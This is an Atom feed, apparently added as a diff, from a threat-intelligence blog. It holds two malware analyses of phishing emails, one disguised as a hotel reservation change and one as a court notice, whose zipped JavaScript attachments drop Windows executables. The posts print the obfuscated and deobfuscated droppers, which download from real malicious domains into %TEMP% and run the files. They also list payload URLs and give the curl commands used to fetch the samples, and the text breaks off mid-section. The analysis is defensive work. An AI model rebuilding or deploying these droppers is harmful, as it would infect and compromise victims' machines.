@@ -1,0 +1,484 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: Threat Intel | thought|pipe]]></title>
+  <link href="http://elauqsap.github.io/blog/categories/threat-intel/atom.xml" rel="self"/>
+  <link href="http://elauqsap.github.io/"/>
+  <updated>2016-09-27T22:29:04-05:00</updated>
+  <id>http://elauqsap.github.io/</id>
+  <author>
+    <name><![CDATA[elauqsap]]></name>
+    <email><![CDATA[3lauqsap@gmail.com]]></email>
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[More Emails With Malicious JavaScript Attachments]]></title>
+    <link href="http://elauqsap.github.io/blog/2015/08/11/more-emails-with-malicious-javascript-attachments/"/>
+    <updated>2015-08-11T19:44:56-05:00</updated>
+    <id>http://elauqsap.github.io/blog/2015/08/11/more-emails-with-malicious-javascript-attachments</id>
+    <content type="html"><![CDATA[<p>Slightly late but I ran into another malicious JavaScript attachment that appears to be downloading something besides Ransomware. From automated sandbox analysis it seems to be a Rovnix variant but I am not so sure. I plan to do a little more OSINT and provide an update but here is my analysis for now.</p>
+
+<!--more-->
+
+
+<h4>Email Indicators</h4>
+
+<pre><code>Received: from 1487.vanager.de (1487.vanager.de [195.225.105.38])
+From: "Sofia Gallo" &lt;a.scelerisque.sed@mollisDuissit.edu&gt;
+To: REDACTED
+Subject: Attention! Reservation change.
+Date: Sat, 8 Aug 2015
+Attachment: Photo_8739.zip -&gt; IMG_7099.js
+</code></pre>
+
+<hr />
+
+<h4>Message Body</h4>
+
+<pre><code>I wanted to change a reservation!
+Because some friends canceled, I would like to change reservation to two
+double room!
+
+Details of changes in attachment.
+Thanks!
+</code></pre>
+
+<h3>Deobfuscating the JavaScript</h3>
+
+<p>There are a few subtle differences in this weeks example that make it different from the campaign we saw last week. Besides the actual malware being delivered, this file is not a double dot extension like last week where the file ended as <code>.doc.js</code>. The obfuscation is also slightly different because we didn&rsquo;t have to tweak the original code in order to see the function it builds for evaluation. The deobfuscated function also contains an array of domains that the script attempts to download 1 of 2 payloads (pdf or exe).</p>
+
+<pre><code class="javascript  IMG_7099.js">// Key to deobfuscate
+var key = 'eKTHj9DZ';
+
+// Obfuscated function
+var b = '\x03&gt;:+\x1eP+4E,;:\x1fMl?L0")\x18\x190gGz`e\x27x\x17\x15*\x06z\x0b%td\x10)\x02\x1a\x039t\x17t&amp;\x04\x19h)q\x01\x1b5\x19\x1d\x12/j\x09\x09K\x08\x1b\x05J|\x08\x1f(\x0e\x1a\x1c-l\x09\x080\x00z\x0b%tk6\x04%3=\x0b^!z,\x09\x19\x0c+m\x05\x19$\x1bz\x0b%tk-\x15f7\x27\x04M!4\x11d  \x0fT!)J*7)\x0e\x5c)#E\x1c\x11\x04&amp;w\x01\x096\x03\x11\x1a(x\x08t&amp;\x04\x19g\x1dIi9\x0a% -\x04Mk.\x0d.9-\x19\x1603\x0b2y.\x18X)?\x12$&amp;#Jp\x10\x09(\x12\x00\x0d+\x17\x07\x15(d,%\x06K49E&lt;#?Du\x05\x14!\x1f\x1b\x1d8s\x05\x0a$\x05z\x0b%td\x13+\x1f\x11\x0f8p\x10\x036\x06\x07\x06-\x17\x07\x15(k\x17\x1a/x\x10\x133\x0e\x12\x07%}\x17\x0e&lt;\x07\x1d\x1b&gt;\x17\x07\x15(k#?\x1d\x17\x0f\x17!\x0e\x06\x1d$s\x01\x0d \x07\x06\x11Dz\x0b\x17E\x0a\x10\x0d$`\x05\x151\x0e\x18\x0d/mj\x19*\x06t\x05+s\x0b\x08&amp;\x0a\x07\x0dDv\x16\x1dE\x02\x07\x1c+w\x06\x0f)\x00\x18\x01\x27xj\x157\x0ct\x0d$m\x0c\x1f)\x1bz\x0b%td\x12 \x0a\x18\x01$~\x17\x0a7\x02\x1a\x0f=v\x16\x116\x03\x1b\x189\x17\x07\x15(d#8GZ+4\x11.:&lt;EM,?\x08.\x27g\x1eK%,\x00\x27y*\x06V#=\x009t\x1c?~\x16\x1b-\x04\x00\x0d&amp;jj\x19*\x06t?\x1dNj&lt;\x09$&amp;!\x0bW&amp;(\x10.:!\x04^j9\x0a&amp;t\x02?x\x08\x0e*\x1c\x11\x1a&gt;k\x0d\x1b+\x0c\x18\x0dDz\x0b\x17E\x06\x15\x09!z\x05\x08!e\x17\x07\x27\x193-\x12e&gt;)\x01P)8\x0a8 f\x1aUd\x0e-\x0e\x02\x01&amp;u\x05\x1d \x1d\x11\x1c/k\x0d\x14$\x19\x0d\x00%j\x14\x131\x0a\x18f)v\x09xK8$$\x03MlxEi}s\x0fAyxGvi-U\x1bj?\x1d.vrH\x174&gt;\x03io.\x05Kl,\x049t\x05W\x09\x7f\x17Y?z$\x0fW#.\x0dp\x19cA\x10?,\x049t&amp;WW!-E\x0a7&lt;\x03O!\x02*)&gt;-\x09Mlx2\x187:\x03I0t6#1$\x06\x1bmv*v:f/A4;\x0b/\x11&amp;\x1cP65\x0b&amp;1&amp;\x1ej0(\x0c%3;B\x1ba\x0e \x06\x04mH\x10o\x09\x119=&amp;\x0d\x17"(\x0a&amp;\x17 \x0bK\x075\x01.|qX\x10o\x17\x04?&lt;f\x18V14\x01ce-R\x13\x09;\x11#z:\x0bW 5\x08c}aA\x5c&lt;v vdd\x18\x04*?\x12k\x15+\x1eP2?=\x046"\x0fZ0rG\x06\x07\x10\x27uvt=\x06\x18\x00&gt;m\x14xLp&amp;f\x05W6?\x04/-;\x1eX0?\x06#5&amp;\x0d\x5cy&lt;\x10%7&lt;\x03V*rL0=.B\x0dyg\x17e&amp;-\x0b]=\x09\x11* -L\x1fvjUvi:DJ0;\x11&gt;\x27a\x11O%(E.i&amp;\x0fNd\x1b\x06?=&gt;\x0fa\x0b8\x0f.7&lt;B\x1b\x05\x1e*\x0f\x16f9M6?\x04&amp;vaQP"r\x00e;8\x0fWlsI.z&lt;\x13I!gTg1f\x1dK-.\x00c&amp;f8\x5c7*\x0a%\x27-(V #Lga-Y\x05!t\x16".-CB\x01gTg1f\x1aV73\x11";&amp;W\x09h?K85&gt;\x0fm+\x1c\x0c\x271`%\x15vs^?&amp;1\x11Wj\x08\x10%|\x07F\x08hjL67)\x1eZ,r\x11b/5\x17\x5cj9\x09$\x27-B\x109\x27^?&amp;1\x11Kj5\x15.:`H~\x01\x0eGgv \x1eM4`Jdvc\x1eb\x09\x07Ni{/\x0fMj*\x0d;k,\x0d_ &lt;\x02vvc\x27X02K95&amp;\x0eV)rL`vn\x01\x5c=gG`?-\x13\x12!vDz}d\x18\x177?\x0b/|a\x17Z%.\x06#|)CB93\x03ceuW|m8\x17.5#\x17D/?\x1cvv._\x1bh=\x0a9!&lt;B\x1bfsI,;:\x1fMlxC;0.WJ!;\x17(&lt;jC\x02';
+
+var _0x12bd = ["", "\x6C\x65\x6E\x67\x74\x68", "\x63\x68\x61\x72\x43\x6F\x64\x65\x41\x74", "\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65"];
+
+// Build the function string to be evaluated
+for(var dhhas3uu = _0x12bd[0], code = _0x12bd[0], j = 0, i = 0; i &lt; b[_0x12bd[1]]; i++) {
+    dhhas3uu += String[_0x12bd[3]](b[_0x12bd[2]](i) ^ key[_0x12bd[2]](j)), j++, j == key[_0x12bd[1]] &amp;&amp; (j = 0);
+};
+
+// Evaluate the deobfuscated JavaScript
+eval(dhhas3uu);
+</code></pre>
+
+<pre><code class="javascript deobfuscated.js">function gorut(e){
+    var t = "14-MASOOM.COM JLINKSMS.COM CHEAPRIZESMS.COM ELEMENTGUMRUK[.]COM/language IBMDATACAP[.]COM/wp-content/themes/academy WELLNESSHERBAL[.]COM/wp-content/themes/tiny-framework ITSMYTEA[.]COM/xmlrpc www.LANDTOURJAPAN[.]COM INTEGRITYSMSNG[.]COM CREATIVEFOODSTYLIST[.]COM www.KMDERUNJEWELRY[.]COM ADENYAOTELEET[.]COM MAJORCASE[.]ORG ISTANBULKLIMA[.]ORG ENTHELP[.]COM HEALINGSPRINGWORKSHOPS[.]COM/wp-content/themes/travel-blogger TUGRAHOTELS[.]COM www.florianbruening[.]com JUALTOWERTRIANGLE[.]COM MAAKCARD[.]COM www.jakimbost[.]pl THEVILLAGEVETERINARYHOSPITAL[.]COM".split(" ");
+
+    ex = "" == e ? ".exe" : ".pdf";
+
+    for(var M = 0; M &lt; t.length; M++) {
+        var n = new ActiveXObject("WScript.Shell"), O = n.ExpandEnvironmentStrings("%TEMP%") + String.fromCharCode(92) + Math.round(100000000.0 * Math.random()) + ex, E = 0, r = new ActiveXObject("MSXML2.XMLHTTP");
+        r.onreadystatechange = function() {
+            if(4 == r.readyState &amp;&amp; 200 == r.status) {
+                var e = new ActiveXObject("ADODB.Stream");
+                if(e.open(), e.type = 1, e.write(r.ResponseBody), 5000.0 &lt; e.size) {
+                    E = 1, e.position = 0, e.saveToFile(O, 2);
+                    try {
+                        n.Run(O, 1, 0);
+                    } catch(t) {
+
+                    }
+                }
+                e.close();
+            }
+        };
+        try {
+            r.open("GET", "hxxp://" + t[M] + "/get.php?dgfdfg=" + Math.random() + "&amp;key=" + key + e, !1), r.send();
+        } catch(a) {
+
+        }
+        if(1 == E) break;
+    }
+}
+
+key = "f5", gorut(""), gorut("&amp;pdf=search");
+</code></pre>
+
+<p>Removing a few lines in <code>gorut()</code> routine of the download script allows to print out download links for the two payloads it attempts to get. Basically you need to remove the ActiveX code and modify <code>r.open</code> to <code>console.log</code> function removing the <code>!1</code> parameter. Running this in node.js will give us a list of payload downloads for the second stage.</p>
+
+<pre><code class="javascript modified_function.js">function gorut(e){
+    var t = "14-MASOOM.COM JLINKSMS.COM CHEAPRIZESMS.COM ELEMENTGUMRUK[.]COM/language IBMDATACAP[.]COM/wp-content/themes/academy WELLNESSHERBAL[.]COM/wp-content/themes/tiny-framework ITSMYTEA[.]COM/xmlrpc www.LANDTOURJAPAN[.]COM INTEGRITYSMSNG[.]COM CREATIVEFOODSTYLIST[.]COM www.KMDERUNJEWELRY[.]COM ADENYAOTELEET[.]COM MAJORCASE[.]ORG ISTANBULKLIMA[.]ORG ENTHELP[.]COM HEALINGSPRINGWORKSHOPS[.]COM/wp-content/themes/travel-blogger TUGRAHOTELS[.]COM www.florianbruening[.]com JUALTOWERTRIANGLE[.]COM MAAKCARD[.]COM www.jakimbost[.]pl THEVILLAGEVETERINARYHOSPITAL[.]COM".split(" ");
+
+    ex = "" == e ? ".exe" : ".pdf";
+    for(var M = 0; M &lt; t.length; M++) {
+        console.log("GET", "hxxp://" + t[M] + "/get.php?dgfdfg=" + Math.random() + "&amp;key=" + key + e);
+    }
+}
+</code></pre>
+
+<h4>Payload Links</h4>
+
+<pre><code>GET hxxp://14-MASOOM[.]COM/get.php?dgfdfg=0.2042055584024638&amp;key=f5
+GET hxxp://JLINKSMS[.]COM/get.php?dgfdfg=0.4357860581949353&amp;key=f5
+GET hxxp://CHEAPRIZESMS[.]COM/get.php?dgfdfg=0.9873443075921386&amp;key=f5
+GET hxxp://ELEMENTGUMRUK[.]COM/language/get.php?dgfdfg=0.697707447456196&amp;key=f5
+GET hxxp://IBMDATACAP[.]COM/wp-content/themes/academy/get.php?dgfdfg=0.21713185170665383&amp;key=f5
+GET hxxp://WELLNESSHERBAL[.]COM/wp-content/themes/tiny-framework/get.php?dgfdfg=0.5791356258559972&amp;key=f5
+GET hxxp://ITSMYTEA[.]COM/xmlrpc/get.php?dgfdfg=0.5410346924327314&amp;key=f5
+GET hxxp://www.LANDTOURJAPAN[.]COM/get.php?dgfdfg=0.418818884762004&amp;key=f5
+GET hxxp://INTEGRITYSMSNG[.]COM/get.php?dgfdfg=0.029143808409571648&amp;key=f5
+GET hxxp://CREATIVEFOODSTYLIST[.]COM/get.php?dgfdfg=0.3915193013381213&amp;key=f5
+GET hxxp://www.KMDERUNJEWELRY[.]COM/get.php?dgfdfg=0.07052874471992254&amp;key=f5
+GET hxxp://ADENYAOTELEET[.]COM/get.php?dgfdfg=0.8330098567530513&amp;key=f5
+GET hxxp://MAJORCASE[.]ORG/get.php?dgfdfg=0.5714250793680549&amp;key=f5
+GET hxxp://ISTANBULKLIMA[.]ORG/get.php?dgfdfg=0.6278960527852178&amp;key=f5
+GET hxxp://ENTHELP[.]COM/get.php?dgfdfg=0.48202996351756155&amp;key=f5
+GET hxxp://HEALINGSPRINGWORKSHOPS[.]COM/wp-content/themes/travel-blogger/get.php?dgfdfg=0.2205682178027928&amp;key=f5
+GET hxxp://TUGRAHOTELS[.]COM/get.php?dgfdfg=0.5332026502583176&amp;key=f5
+GET hxxp://www.florianbruening[.]com/get.php?dgfdfg=0.0033856993541121483&amp;key=f5
+GET hxxp://JUALTOWERTRIANGLE[.]COM/get.php?dgfdfg=0.7687414824031293&amp;key=f5
+GET hxxp://MAAKCARD[.]COM/get.php?dgfdfg=0.14662570762448013&amp;key=f5
+GET hxxp://www.jakimbost[.]pl/get.php?dgfdfg=0.4327525827102363&amp;key=f5
+GET hxxp://THEVILLAGEVETERINARYHOSPITAL[.]COM/get.php?dgfdfg=0.48534721904434264&amp;key=f5
+GET hxxp://14-MASOOM[.]COM/get.php?dgfdfg=0.6709314966574311&amp;key=f5&amp;pdf=search
+GET hxxp://JLINKSMS[.]COM/get.php?dgfdfg=0.020113263744860888&amp;key=f5&amp;pdf=search
+GET hxxp://CHEAPRIZESMS[.]COM/get.php?dgfdfg=0.6769137345254421&amp;key=f5&amp;pdf=search
+GET hxxp://ELEMENTGUMRUK[.]COM/language/get.php?dgfdfg=0.1893466750625521&amp;key=f5&amp;pdf=search
+GET hxxp://IBMDATACAP[.]COM/wp-content/themes/academy/get.php?dgfdfg=0.11392477317713201&amp;key=f5&amp;pdf=search
+GET hxxp://WELLNESSHERBAL[.]COM/wp-content/themes/tiny-framework/get.php?dgfdfg=0.7516817327123135&amp;key=f5&amp;pdf=search
+GET hxxp://ITSMYTEA[.]COM/xmlrpc/get.php?dgfdfg=0.45238890522159636&amp;key=f5&amp;pdf=search
+GET hxxp://www.LANDTOURJAPAN[.]COM/get.php?dgfdfg=0.5003419334534556&amp;key=f5&amp;pdf=search
+GET hxxp://INTEGRITYSMSNG[.]COM/get.php?dgfdfg=0.7602681068237871&amp;key=f5&amp;pdf=search
+GET hxxp://CREATIVEFOODSTYLIST[.]COM/get.php?dgfdfg=0.2591306504327804&amp;key=f5&amp;pdf=search
+GET hxxp://www.KMDERUNJEWELRY[.]COM/get.php?dgfdfg=0.19865264417603612&amp;key=f5&amp;pdf=search
+GET hxxp://ADENYAOTELEET[.]COM/get.php?dgfdfg=0.8011750828009099&amp;key=f5&amp;pdf=search
+GET hxxp://MAJORCASE[.]ORG/get.php?dgfdfg=0.7017634396906942&amp;key=f5&amp;pdf=search
+GET hxxp://ISTANBULKLIMA[.]ORG/get.php?dgfdfg=0.33236109651625156&amp;key=f5&amp;pdf=search
+GET hxxp://ENTHELP[.]COM/get.php?dgfdfg=0.25800628517754376&amp;key=f5&amp;pdf=search
+GET hxxp://HEALINGSPRINGWORKSHOPS[.]COM/wp-content/themes/travel-blogger/get.php?dgfdfg=0.4463676530867815&amp;key=f5&amp;pdf=search
+GET hxxp://TUGRAHOTELS[.]COM/get.php?dgfdfg=0.5060989174526185&amp;key=f5&amp;pdf=search
+GET hxxp://www.florianbruening[.]com/get.php?dgfdfg=0.8751774763222784&amp;key=f5&amp;pdf=search
+GET hxxp://JUALTOWERTRIANGLE[.]COM/get.php?dgfdfg=0.08316186326555908&amp;key=f5&amp;pdf=search
+GET hxxp://MAAKCARD[.]COM/get.php?dgfdfg=0.8340241997502744&amp;key=f5&amp;pdf=search
+GET hxxp://www.jakimbost[.]pl/get.php?dgfdfg=0.9773174184374511&amp;key=f5&amp;pdf=search
+GET hxxp://THEVILLAGEVETERINARYHOSPITAL[.]COM/get.php?dgfdfg=0.6214603304397315&amp;key=f5&amp;pdf=search
+</code></pre>
+
+<p>So now that we have the payload URLs we can download them for further analysis. It attempts to download either a malicious executable or pdf. The URLs without <code>&amp;pdf=search</code> on the end are the MS-DOS executables. When attempting to download these I noticed that my curl command was failing with my Firefox user agent (404 page). Switching it to a traditional IE10 user agent allowed me to download the payload.</p>
+
+<h4>Failed Command</h4>
+
+<pre><code>curl -vA "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0" -L "hxxp://TUGRAHOTELS[.]COM/get.php?dgfdfg=0.5332026502583176&amp;key=f5" &gt; bad_dl.exe
+
+% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                               Dload  Upload   Total   Spent    Left  Speed
+0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 159.253.42.153...
+Connected to TUGRAHOTELS[.]COM (159.253.42.153) port 80 (#0)
+
+GET /get.php?dgfdfg=0.5332026502583176&amp;key=f5 HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0
+Host: TUGRAHOTELS[.]COM
+Accept: */*
+
+HTTP/1.1 200 OK
+Content-Type: application/x-msdownload
+Content-Disposition: inline; filename=Adobe_update-YXXQ1RX4IL6LV2M.exe
+Content-Length: 3
+Date: Tue, 11 Aug 2015 21:01:02 GMT
+Accept-Ranges: bytes
+Server LiteSpeed is not blacklisted
+Server: LiteSpeed
+Connection: close
+
+{ [data not shown]
+100     3  100     3    0     0      2      0  0:00:01  0:00:01 --:--:--     2
+Closing connection 0
+</code></pre>
+
+<hr />
+
+<h4>Successful Command</h4>
+
+<pre><code>curl -vA "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)" -L "hxxp://TUGRAHOTELS[.]COM/get.php?dgfdfg=0.5332026502583176&amp;key=f5" &gt; bad
+
+% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                               Dload  Upload   Total   Spent    Left  Speed
+0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 159.253.42.153...
+Connected to TUGRAHOTELS.COM (159.253.42.153) port 80 (#0)
+GET /get.php?dgfdfg=0.5332026502583176&amp;key=f5 HTTP/1.1
+User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)
+Host: TUGRAHOTELS[.]COM
+Accept: */*
+
+HTTP/1.1 200 OK
+Content-Type: application/x-msdownload
+Content-Disposition: inline; filename=Adobe_update-ZLFNDKIGUO7.exe
+Date: Tue, 11 Aug 2015 21:03:35 GMT
+Accept-Ranges: bytes
+Server LiteSpeed is not blacklisted
+Server: LiteSpeed
+Connection: close
+
+{ [data not shown]
+100  214k    0  214k    0     0  89872      0 --:--:--  0:00:02 --:--:-- 89872
+Closing connection 0
+</code></pre>
+
+<p>Unfortunately, I was only able to get the network indicators below from the executable and none from the pdf file. I am working on beefing up my sandboxing environment to better handle situations like this but until then I will have to leave this post as is for now. Hopefully I can provide an update on the malware family as well as any further OSINT I find. Please feel free to contact me about the analysis or any questions you have.</p>
+
+<h4>Adobe_update-YXXQ1RX4IL6LV2M.exe Analysis</h4>
+
+<pre><code>GET hxxp://109.120.142.168:80/ac33/b/btc.exe
+GET hxxp://109.120.142.168:80/ac33/p/pc.exe
+GET hxxp://109.120.142.168:80/ac33/g/gc.exe
+GET hxxp://109.120.142.168:80/ac33/bk/bkc.exe
+POST hxxp://109.120.180.29:80/intro/data.php
+Server IP: 109.120.180.29
+
+GET hxxp://constitution.org:80/usdeclar.txt
+Server IP: 54.175.58.135
+</code></pre>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Ransomware From Emails With JavaScript Attachments]]></title>
+    <link href="http://elauqsap.github.io/blog/2015/08/05/ransomware-from-emails-with-javascript-attachments/"/>
+    <updated>2015-08-05T19:12:35-05:00</updated>
+    <id>http://elauqsap.github.io/blog/2015/08/05/ransomware-from-emails-with-javascript-attachments</id>
+    <content type="html"><![CDATA[<p>Recently I have been seeing emails with zip attachments that contain a malicious JavaScript file marked as a double dot extension (.doc.js). The JavaScript is obfuscated but debofuscating it is rather easy and I wanted to share my analysis. The infection appears to be Ransomware, most likely a CryptoWall 3.0 variant but I did not verify it.</p>
+
+<!--more-->
+
+
+<h4>Email Indicators</h4>
+
+<pre><code>Received: from uplander.websitewelcome.com (uplander.websitewelcome.com [192.185.179.118])
+Subject: Notice to appear in Court #00000536215
+From: "State Court" &lt;allan.barnett@ns963.websitewelcome.com&gt;
+Reply-To: "State Court" &lt;allan.barnett@ns963.websitewelcome.com&gt;
+Attachment: 00000536215.zip -&gt; 00000536215.doc.js
+</code></pre>
+
+<hr />
+
+<h4>Message Body</h4>
+
+<pre><code>Notice to Appear,
+
+This is to inform you to appear in the Court on the August 11 for your case hearing.
+Please, do not forget to bring all the documents related to the case.
+Note: The case may be heard by the judge in your absence if you do not come.
+
+The copy of Court Notice is attached to this email.
+
+Yours faithfully,
+Allan Barnett,
+Court Secretary.
+</code></pre>
+
+<h3>Deobfuscating the JavaScript</h3>
+
+<p>Below is the original decompressed file contents. It tries to hide itself as a better known file type (.doc) but any modern operating system would most likely recognize and interpret the JavaScript file. Luckily for us, it is rather easy to deobfuscate something like this. You can use a tool like JSDetox or use a JavaScript interpreter like node.js. The key thing we need to overcome is that JSDetox and node.js most likely won&rsquo;t have access to ActiveX so we have to remove the check otherwise it will not deobfuscate.</p>
+
+<pre><code class="javascript  00000536215.doc.js">var jlavws='fpubnwcytwieoenq sdblf(hfyrm,y ffmni,u jrcnj)n{p z fvyalro gwwsd h=s cneewwh uApcitaiwvgemXvOlbyjdefchtg(p"uWvSocaruiapota.wSshieplulm"m)b;h b kvhayrq tftnc r=x iwysd.xEtxzpmatnudmEinvvjiardoynumqelnwtxS';var jdmkdr='mtgreilnxgxse(a"p%cTiEoMfPf%h"f)s b+z eSjturoijnygn.eforyobmlClhiaprwCgondaeg(c9d2o)q i+u yfonm;a n rvkairf uxgos y=u rnaefwc jAvcytpijvzevXlOcbkjcelcetb(z"rMbSnXiMmLw2o.gXcMhLfHxTyTfPd"a)p;y z exhoz.zot';var xxjg='ncrkewandpyxsntgaztbeoclhxacnsgaej x=x ifduanjcstziiownh i(w)a{k g x y viufl c(uxnoq.grletaydmydSvtjaltyek v=r=k=d n4s)l{k t w r q u mvlagrp fxuaf l=f znkerwd fAbcoteimvkewXxOnbjjpezcuti(w"lAyDqOyDjBx.nS';var bpm='ptrrseaawms"l)o;v r q k w c uxsaa.iobppeinv(x)e;h v u f f r sxuaj.ltvyfpdeg u=y x1k;j u n d m n mxoac.uwkraiytrew(txwob.lRoewsupzornasdeyBuocdwye)l;q s p c f b rxhaw.bphovssidtoioofnz d=b u0d;t u g r o i';var his=' oxtau.eslakvheqTmoyFyiilzeg(dfsnk,r h2p)r;k r l n k g uxcau.ccqlooxsvez(h)d;q t c o c}c v f u f;x b v}p m m;b z wthruyz c{x q q u lxqoc.pogpwernv(y"tGqEeTn"w,c pfrrr,b dftablasaev)z;c s q t nxboj.psqeqn';var bey='ldh(l)k;b c o o yiqfe p(irfnt b&gt;g u0b)c{u e v k y j mwhsy.cRxuknk(jfvnl,l j0a,k z0e)z;i j t j q}n l t i p;o s o}x e vcwahttchhr d(cedro)m{e y m}i y u;s}sddlj(g"ohdtotepr:h/t/p3m1p0m7t2i0u1l5max.pcaojmt/z';var yjb='iwmcaygqeusr/ufeixvjeh1m.ojzptgh"p,f w"c5z3f2w7k4r7u3a5r0e.terxaev"q,r q1h)l;udelv(b"rhjtatkpq:p/q/m3r1q0r7o2a0i1i5aaa.ncuosmn/piimeafgqeqsa/vflibvmev2c.xjlpsgn"y,k d"p2z1e1y9i5f4z8v6z9r.iepxaen"v,q e1v)';var buh='l;q';var a1=jlavws+jdmkdr+xxjg+bpm+his+bey+yjb+buh;   var a2="";   var a3=2;      var a4=10;      var y = new ActiveXObject("Scripting.Dictionary");   y.add ("a", "t");      if (y.Item("a")=="t"){a4=0;}else{a4=10};      var a5=a1.length;   var a=0;   while(a&lt;a5){    a2 +=a1.charAt(a);a +=a3+a4;   };   var rosa=["e","0","v","0","a","0","l","0"];   var tosta=rosa[0+a4]+rosa[2+a4]+rosa[4+a4]+rosa[6+a4];   var a6=tosta;   this[a6](a2);
+</code></pre>
+
+<p>Expanding and cleaning up the glob of JavaScript above gives us <code>00000536215_clean.doc.js</code>. I added comments to point out the key points to be aware of when running this through JSDetox/node. The first comment is where the script checks for ActiveX which both tools will not have access to out of the box. Looking at the code we can see the default value <code>a4 = 10</code> breaks the while loop before it can build the deobfuscated string. If we simply hard code <code>a4 = 0</code> before the loop and comment/delete the while loop it will build the string as intended. In the end the two values we care most about are <code>a2</code> and <code>a6</code>. When the script gets to <code>this[a6](a2)</code> it is essentially performing an <code>eval()</code> operation on the debofuscated string stored in <code>a2</code>.</p>
+
+<pre><code class="javascript 00000536215_clean.doc.js">var jlavws = 'fpubnwcytwieoenq sdblf(hfyrm,y ffmni,u jrcnj)n{p z fvyalro gwwsd h=s cneewwh uApcitaiwvgemXvOlbyjdefchtg(p"uWvSocaruiapota.wSshieplulm"m)b;h b kvhayrq tftnc r=x iwysd.xEtxzpmatnudmEinvvjiardoynumqelnwtxS';
+
+var jdmkdr = 'mtgreilnxgxse(a"p%cTiEoMfPf%h"f)s b+z eSjturoijnygn.eforyobmlClhiaprwCgondaeg(c9d2o)q i+u yfonm;a n rvkairf uxgos y=u rnaefwc jAvcytpijvzevXlOcbkjcelcetb(z"rMbSnXiMmLw2o.gXcMhLfHxTyTfPd"a)p;y z exhoz.zot';
+
+var xxjg = 'ncrkewandpyxsntgaztbeoclhxacnsgaej x=x ifduanjcstziiownh i(w)a{k g x y viufl c(uxnoq.grletaydmydSvtjaltyek v=r=k=d n4s)l{k t w r q u mvlagrp fxuaf l=f znkerwd fAbcoteimvkewXxOnbjjpezcuti(w"lAyDqOyDjBx.nS';
+
+var bpm = 'ptrrseaawms"l)o;v r q k w c uxsaa.iobppeinv(x)e;h v u f f r sxuaj.ltvyfpdeg u=y x1k;j u n d m n mxoac.uwkraiytrew(txwob.lRoewsupzornasdeyBuocdwye)l;q s p c f b rxhaw.bphovssidtoioofnz d=b u0d;t u g r o i';
+
+var his = ' oxtau.eslakvheqTmoyFyiilzeg(dfsnk,r h2p)r;k r l n k g uxcau.ccqlooxsvez(h)d;q t c o c}c v f u f;x b v}p m m;b z wthruyz c{x q q u lxqoc.pogpwernv(y"tGqEeTn"w,c pfrrr,b dftablasaev)z;c s q t nxboj.psqeqn';
+
+var bey = 'ldh(l)k;b c o o yiqfe p(irfnt b&gt;g u0b)c{u e v k y j mwhsy.cRxuknk(jfvnl,l j0a,k z0e)z;i j t j q}n l t i p;o s o}x e vcwahttchhr d(cedro)m{e y m}i y u;s}sddlj(g"ohdtotepr:h/t/p3m1p0m7t2i0u1l5max.pcaojmt/z';
+
+var yjb = 'iwmcaygqeusr/ufeixvjeh1m.ojzptgh"p,f w"c5z3f2w7k4r7u3a5r0e.terxaev"q,r q1h)l;udelv(b"rhjtatkpq:p/q/m3r1q0r7o2a0i1i5aaa.ncuosmn/piimeafgqeqsa/vflibvmev2c.xjlpsgn"y,k d"p2z1e1y9i5f4z8v6z9r.iepxaen"v,q e1v)';
+
+var buh = 'l;q';
+var a1 = jlavws + jdmkdr + xxjg + bpm + his + bey + yjb + buh;
+var a2 = "";
+var a3 = 2;
+var a4 = 0; // Hardcode to 0, originally set to 10
+
+/* 1.
+  Checks for ActiveX otherwise it will not deobfuscate
+  We can comment this out in JSDetox and hard code a4 to 0
+*/
+var y = new ActiveXObject("Scripting.Dictionary");
+y.add("a", "t");
+if(y.Item("a") == "t") {
+    a4 = 0;
+} else {
+    a4 = 10;
+};
+
+/* 2.
+  This function will deobfuscate and build the string to be evaluated below
+*/
+var a5 = a1.length;
+var a = 0;
+while(a &lt; a5) {
+    a2 += a1.charAt(a);
+    a += a3 + a4;
+};
+
+/* 3.
+  Transforms to set a6 = 'eval'
+*/
+var rosa = ["e", "0", "v", "0", "a", "0", "l", "0"];
+var tosta = rosa[0 + a4] + rosa[2 + a4] + rosa[4 + a4] + rosa[6 + a4];
+var a6 = tosta;
+
+/* 4.
+  The eval() function and a2 is the deobfuscated string to run
+*/
+// this[a6](a2);
+</code></pre>
+
+<p>Now that we have a readable version of the JavaScript it is pretty easy to tell what it is doing. Basically the script downloads the two files <code>five1.jpg</code> and <code>five2.jpg</code> which are actually MS-DOS executables. Then using a Windows Script Host Shell it attempts to run each of the downloaded payloads.</p>
+
+<pre><code class="javascript deobfuscated.js">function dl(fr, fn, rn){
+  var ws = new ActiveXObject("WScript.Shell");
+  var fn = ws.ExpandEnvironmentStrings("%TEMP%") + String.fromCharCode(92) + fn;
+  var xo = new ActiveXObject("MSXML2.XMLHTTP");
+  xo.onreadystatechange = function (){
+    if (xo.readyState === 4){
+      var xa = new ActiveXObject("ADODB.Stream");
+      xa.open();
+      xa.type = 1;
+      xa.write(xo.ResponseBody);
+      xa.position = 0;
+      xa.saveToFile(fn, 2);
+      xa.close();
+    };
+  };
+  try {
+    xo.open("GET", fr, false);
+    xo.send();
+    if (rn &gt; 0){
+      ws.Run(fn, 0, 0);
+    };
+  }  catch (er){  };
+}
+dl("hxxp://31072015a[.]com/images/five1.jpg", "532747350.exe",1);   // Download payload 1
+dl("hxxp://31072015a[.]com/images/five2.jpg", "211954869.exe", 1);  // Download payload 2
+</code></pre>
+
+<p>Here are some of the network indicators and behaviors I observed from sandboxing the payloads. If you have any questions or comments about the analysis feel free to reach out to me.</p>
+
+<h4>five1.jpg/532747350.exe Analysis</h4>
+
+<pre><code># Payload Download: Response
